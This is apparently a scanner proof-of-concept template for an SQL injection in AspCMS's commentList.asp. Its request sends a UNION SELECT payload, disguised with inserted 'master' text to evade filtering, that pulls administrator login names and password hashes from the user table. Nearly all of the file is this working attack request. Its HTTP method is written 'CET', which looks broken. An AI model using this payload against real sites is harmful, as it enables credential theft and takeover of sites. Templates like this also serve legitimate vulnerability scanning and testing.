expression: r0()
id: aspcms-commentlist-sql-injection
info:
  author: daffainfo
  description: "AspCMS commentList.asp \u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\
    \u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u7BA1\u7406\
    \u5458md5\u7684\u5BC6\u7801 app=\"ASPCMS\""
  name: "AspCMS commentList.asp SQL\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/AspCMS%20commentList.asp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'<div class=line1>')
      && response.body.bcontains(b'<div class=line2>')
    request:
      method: CET
      path: /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
